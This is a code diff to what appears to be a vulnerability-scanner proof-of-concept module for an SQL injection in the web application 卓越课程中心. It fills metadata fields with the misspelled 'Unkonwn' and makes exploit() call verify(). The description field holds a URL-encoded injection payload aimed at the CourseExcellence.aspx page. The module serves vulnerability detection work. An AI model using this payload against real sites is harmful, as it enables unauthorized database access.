@@ -8,15 +8,15 @@ class Vuln(ABVuln):
     name = '卓越课程中心 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
         卓越课程中心 /G2S/ShowSystem/CourseExcellence.aspx?page=1&level=%E5%9B%BD%E5%AE%B6%E7%BA%A7%27%20and%201=2%20(select%20db_name(1))--- SQL注入漏洞。
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '卓越课程中心'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '609676ca-d387-4618-a6e5-1320b9ff5d64'
@@ -45,7 +45,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
